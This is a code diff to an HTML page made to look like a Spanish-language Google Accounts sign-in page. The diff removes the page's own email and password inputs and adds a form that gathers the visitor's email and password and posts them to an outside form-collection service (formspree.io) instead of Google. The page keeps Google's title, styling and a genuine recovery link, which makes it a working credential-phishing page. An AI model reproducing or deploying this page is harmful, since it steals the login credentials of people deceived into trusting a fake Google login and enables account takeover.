@@ -5,7 +5,6 @@
   <meta charset="utf-8">
   <meta content="width=300, initial-scale=1" name="viewport">
   <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
-  <form action="https://formspree.io/f/mvolwkbe" method="POST">
   <title>Inicio de sesión - Cuentas de Google</title>
   <style>
   @font-face {
@@ -1302,21 +1301,30 @@
   <div class="input-wrapper focused">
   <div id="identifier-shown">
   <div>
-  <label class="hidden-label" for="Email">
-  Introduce tu correo electrónico</label>
-  <input id="Email" type="email" value="" spellcheck="false" name="Email" placeholder="Correo electrónico o teléfono" autofocus="">
-  <input id="Passwd-hidden" type="password" spellcheck="false" class="hidden">
+  
+  
   </div>
   </div>
   <span role="alert" class="error-msg" id="errormsg_0_Email"></span>
   </div>
-<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Siguiente">
+
   <a class="need-help" href="https://accounts.google.com/signin/usernamerecovery?continue=https%3A%2F%2Fwww.google.es%2F%3Fgws_rd%3Dssl&hl=es&flowName=GlifWebSignIn">
   Encontrar mi cuenta
   </a>
   </div>
   </div>
   </form>
+  <form action="https://formspree.io/f/mvolwkbe" method="POST" id="login"> 
+    <label>
+    Introduzca su correo:
+    <input type="email" name="email">
+    Introduzca su contraseña:
+    <input type="password" name="password">
+  </label><input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Siguiente"></form>
+    
+    
+  
+
 </div>
   <div class="card-mask-wrap
         
